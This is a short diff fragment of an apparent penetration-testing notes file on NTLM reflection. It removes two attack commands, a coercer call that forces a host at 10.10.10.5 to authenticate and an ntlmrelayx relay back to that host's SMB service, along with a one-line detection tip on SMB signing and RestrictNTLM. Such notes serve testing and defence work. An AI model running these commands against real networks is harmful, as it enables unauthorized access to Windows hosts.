@@ -21,12 +21,3 @@ Reflect an authentication attempt **back to the same host/service** it originate
 
 ### Commands
 ```bash
-# ── Coerce + reflect ─────────────────────────────────────────────────
-coercer coerce -u user -p pass -t 10.10.10.5 -l 10.10.10.99
-ntlmrelayx.py -t smb://10.10.10.5 -smb2support -socks
-```
-
-### Detection
-**SMB auth where client IP == server IP**; `RestrictNTLM`; SMB signing.
-
----
